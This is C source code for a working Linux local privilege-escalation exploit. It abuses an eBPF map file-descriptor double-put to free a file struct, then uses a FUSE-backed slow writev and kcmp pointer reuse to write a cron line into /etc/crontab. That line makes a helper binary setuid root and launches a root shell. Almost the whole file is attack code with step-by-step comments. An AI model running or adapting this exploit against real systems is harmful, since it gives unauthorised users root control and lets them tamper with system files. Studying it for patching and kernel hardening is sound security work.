#define _GNU_SOURCE
#include <stdbool.h>
#include <errno.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <linux/kcmp.h>

#ifndef __NR_bpf
# if defined(__i386__)
#  define __NR_bpf 357
# elif defined(__x86_64__)
#  define __NR_bpf 321
# elif defined(__aarch64__)
#  define __NR_bpf 280
# else
#  error
# endif
#endif

int uaf_fd;

int task_b(void *p) {
	/* step 2: start writev with slow IOV, raising the refcount to 2 */
	char *cwd = get_current_dir_name();
	char data[2048];
	sprintf(data, "* * * * * root /bin/chown root:root '%s'/suidhelper; /bin/chmod 06755 '%s'/suidhelper\n#", cwd, cwd);
	struct iovec iov = { .iov_base = data, .iov_len = strlen(data) };
	if (system("fusermount -u /home/user/ebpf_mapfd_doubleput/fuse_mount 2>/dev/null; mkdir -p fuse_mount && ./hello ./fuse_mount"))
		errx(1, "system() failed");
	int fuse_fd = open("fuse_mount/hello", O_RDWR);
	if (fuse_fd == -1)
		err(1, "unable to open FUSE fd");
	if (write(fuse_fd, &iov, sizeof(iov)) != sizeof(iov))
		errx(1, "unable to write to FUSE fd");
	struct iovec *iov_ = mmap(NULL, sizeof(iov), PROT_READ, MAP_SHARED, fuse_fd, 0);
	if (iov_ == MAP_FAILED)
		err(1, "unable to mmap FUSE fd");
	fputs("starting writev\n", stderr);
	ssize_t writev_res = writev(uaf_fd, iov_, 1);
	/* ... and starting inside the previous line, also step 6: continue writev with slow IOV */
	if (writev_res == -1)
		err(1, "writev failed");
	if (writev_res != strlen(data))
		errx(1, "writev returned %d", (int)writev_res);
	fputs("writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.\n", stderr);
	while (1) sleep(1); /* whatever, just don't crash */
}

void make_setuid(void) {
	/* step 1: open writable UAF fd */
	uaf_fd = open("/dev/null", O_WRONLY|O_CLOEXEC);
	if (uaf_fd == -1)
		err(1, "unable to open UAF fd");
	/* refcount is now 1 */

	char child_stack[20000];
	int child = clone(task_b, child_stack + sizeof(child_stack), CLONE_FILES | SIGCHLD, NULL);
	if (child == -1)
		err(1, "clone");
	sleep(3);
	/* refcount is now 2 */

	/* step 2+3: use BPF to remove two references */
	for (int i=0; i<2; i++) {
		struct bpf_insn insns[2] = {
			{
				.code = BPF_LD | BPF_IMM | BPF_DW,
				.src_reg = BPF_PSEUDO_MAP_FD,
				.imm = uaf_fd
			},
			{
			}
		};
		union bpf_attr attr = {
			.prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
			.insn_cnt = 2,
			.insns = (__aligned_u64) insns,
			.license = (__aligned_u64)""
		};
		if (syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr)) != -1)
			errx(1, "expected BPF_PROG_LOAD to fail, but it didn't");
		if (errno != EINVAL)
			err(1, "expected BPF_PROG_LOAD to fail with -EINVAL, got different error");
	}
	/* refcount is now 0, the file is freed soon-ish */

	/* step 5: open a bunch of readonly file descriptors to the target file until we hit the same pointer */
	int status;
	int hostnamefds[1000];
	int used_fds = 0;
	bool up = true;
	while (1) {
		if (waitpid(child, &status, WNOHANG) == child)
			errx(1, "child quit before we got a good file*");
		if (up) {
			hostnamefds[used_fds] = open("/etc/crontab", O_RDONLY);
			if (hostnamefds[used_fds] == -1)
				err(1, "open target file");
			if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, hostnamefds[used_fds]) == 0) break;
			used_fds++;
			if (used_fds == 1000) up = false;
		} else {
			close(hostnamefds[--used_fds]);
			if (used_fds == 0) up = true;
		}
	}
	fputs("woohoo, got pointer reuse\n", stderr);
	while (1) sleep(1); /* whatever, just don't crash */
}

int main(void) {
	pid_t child = fork();
	if (child == -1)
		err(1, "fork");
	if (child == 0)
		make_setuid();
	struct stat helperstat;
	while (1) {
		if (stat("suidhelper", &helperstat))
			err(1, "stat suidhelper");
		if (helperstat.st_mode & S_ISUID)
			break;
		sleep(1);
	}
	fputs("suid file detected, launching rootshell...\n", stderr);
	execl("./suidhelper", "suidhelper", NULL);
	err(1, "execl suidhelper");
}
